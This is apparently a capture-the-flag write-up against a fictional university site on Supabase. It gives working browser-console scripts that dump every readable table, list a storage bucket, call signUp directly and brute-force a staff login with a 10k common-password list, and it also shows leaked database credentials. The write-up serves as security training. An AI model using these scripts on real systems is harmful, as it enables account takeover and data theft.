---
created: 2024-12-09T15:10
updated: 2024-12-15T08:05
points: 450
---

## Basics

With just some basic digging we can find two flags.

```txt [robots.txt]
User-agent: *
Disallow: /api/
Disallow: /super-private-do-not-enter/
Allow: /
```

### flag 1

```flag
flag::easy::456e4cf23533dafd6533c4d24d2599adb5e72583
```

```js [page-4b9910aed5976f5d.js]
l.jsx)("div", {
	className: "hidden",
	children: "flag::easy::aecd9d79901a1251f845897b310c74b7e71d2531"
})]
```

### flag 2

```flag
flag::easy::aecd9d79901a1251f845897b310c74b7e71d2531
```

## Allow Signup
Signup doesn't work sadly, even after I patched it to allow any email.

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1733775042/2024/12/e546bc49ddf87b2d0b2218878c391215.png)

## Leak App

By overriding the source JavaScript, we can leak the variables used in those functions.

At the same time, we also remove the scope on `select *`, maybe it will review more information.

```js [page-4b9910aed5976f5d.js]
(async function() {
	let {data: e, error: s} = await c.from("bulletins").select("*");
	console.log("Database:", c);
	console.log("Bulletin Data:", e);
	s ? console.error("Error fetching bulletins:", s) : t(e)
})()
```

### flag 3
![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1733940127/2024/12/c6d4d63d6af3690db7882c3a2edd94a2.png)

```flag
flag::easy::68e4b805974b53e322e52382e5ce387d1b13f325
```

### Storage Leak
We can see that there is a storage bucket named `university-news`, let's leak it.

```js
let {title: t, children: s, imagePath: i, date: a} = e
  , {data: r} = n().storage.from("university-news").getPublicUrl(i);
```

```js [console]
const {data:files}=await temp1.storage.from("university-news").list('',{
limit: 100,
offset: 0
});
const urls = files.map(e=>temp1.storage.from("university-news").getPublicUrl(e.name).data.publicUrl);
[
  "https://ubssibzsnwtwbbvbhbvb.supabase.co/storage/v1/object/public/university-news/ancient.webp",
  "https://ubssibzsnwtwbbvbhbvb.supabase.co/storage/v1/object/public/university-news/cthulhu.webp",
  "https://ubssibzsnwtwbbvbhbvb.supabase.co/storage/v1/object/public/university-news/herbert-west.jpg",
  "https://ubssibzsnwtwbbvbhbvb.supabase.co/storage/v1/object/public/university-news/README%20(1).md",
  "https://ubssibzsnwtwbbvbhbvb.supabase.co/storage/v1/object/public/university-news/README.md",
  "https://ubssibzsnwtwbbvbhbvb.supabase.co/storage/v1/object/public/university-news/squid.jpg",
  "https://ubssibzsnwtwbbvbhbvb.supabase.co/storage/v1/object/public/university-news/student-campus.jpg",
  "https://ubssibzsnwtwbbvbhbvb.supabase.co/storage/v1/object/public/university-news/symposium.jpg",
  "https://ubssibzsnwtwbbvbhbvb.supabase.co/storage/v1/object/public/university-news/university-front.jpg",
  "https://ubssibzsnwtwbbvbhbvb.supabase.co/storage/v1/object/public/university-news/wireframe.jpg"
]
```

## Storage Info
We find this inside `README.md` and `README (1).md`.

```
connect to ap-southeast-2 ec2
connect to db postgres.kwhiugfxfqtfldzjaunl on ap-southeast-2 pooler using password "allhailcthulhuthegreatdreamer"

connect to ap-southeast-2 ec2
connect to db as cultist on project kwhiugfxfqtfldzjaunl on ap-southeast-2 pooler using password "allhailcthulhuthegreatdreamer"
```

Welp, can't connect to them due to IP restrictions.

## Signup Attempt 2

Ok, since sign up via UI doesn't work, I shall just call the methods directly.

```js [console]
console.log(await temp2.auth.signUp({
  email: 'me@gmail.com',
  password: 'password',
}));
```

Huh it works, I got an email and can login now.

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1733940850/2024/12/30a1e0c964e8b646d241e724c1e900be.png)
### flag 4

```flag
flag::easy::4a7314c446cfb28b31118bc606a82627ac18779e
```

## Sign In as Admin

On the site we can find a email `herbert.west@miskatonicuniversity.us`, let's try to login as that with 10k passwords.

```js [console]
const passwords = (await fetch("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/10k-most-common.txt").then(r=>r.text())).split("\n");
const sleep = ms => new Promise(r => setTimeout(r, ms));
for(let i=0;i<passwords.length;){
    console.log("trying",i);
    const {data, error}=await temp1.auth.signInWithPassword({email:"herbert.west@miskatonicuniversity.us", password:passwords[i]});
    if(error) {
        if(error.message==="Request rate limit reached"){
            await sleep(500);
            continue
        } else {i++;continue}
    }
    console.log("yay",data)
    break;
}
```

## Leak all Tables

```js [console]
const tables = (await temp1.schema("information_schema").from("tables").select("*")).data;
for(let table of tables){
    const {data, error} = await temp1.schema(table.table_schema).from(table.table_name).select("*");
    if(error)continue;
    console.log("======",table.table_schema,".",table.table_name,"=======");
    console.table(data);
}
```

### `public.staff`

| (index) | id  | first_name  | last_name  | email                                                          |
| ------- | --- | ----------- | ---------- | -------------------------------------------------------------- |
| 0       | 1   | 'Herbert'   | 'West'     | 'herbert.west@miskatonicuniversity.us'                         |
| 1       | 2   | 'Henry'     | 'Armitage' | 'henry.armitage@miskatonicuniversity.us'                       |
| 2       | 3   | 'Ferdinand' | 'Ashley'   | 'ferdinand.ashley@miskatonicuniversity.us'                     |
| 3       | 4   | 'Allen'     | 'Halsey'   | 'allen.halsey@miskatonicuniversity.us'                         |
| 4       | 5   | 'Albert'    | 'Wilmarth' | `flag::intermediate::602c6d77e8294687ceb9608f3df5d2f89adc31ae` |

### flag 5

```flag
flag::intermediate::602c6d77e8294687ceb9608f3df5d2f89adc31ae
```

## DNS
![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1734027236/2024/12/9bdc4713e9ba3ff531554d9a4ec01d69.png)
### flag 6

```flag
flag::easy::2c4452b6c23b2be707fcab43689ec06b7a91b6a5
```

## Wayback Machine

[web.archive.org/cdx/search/cdx?url=*.miskatonicuniversity.us&output=text&fl=original&collapse=urlkey](https://web.archive.org/cdx/search/cdx?url=*.miskatonicuniversity.us&output=text&fl=original&collapse=urlkey)

```
...
https://miskatonicuniversity.us/api/
https://miskatonicuniversity.us/atom.xml
https://miskatonicuniversity.us/even-more-super-private-do-not-enter
https://miskatonicuniversity.us/favicon.ico
https://miskatonicuniversity.us/feed/
https://miskatonicuniversity.us/feeds/all.atom.xml
...
```

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1734028108/2024/12/e017289da9023035a9e61331ac7f053c.png)

### flag 7

```flag
flag::intermediate::f49ae1ae7e56e8982fd0bb6ffc16c0f3d23a81b3
```
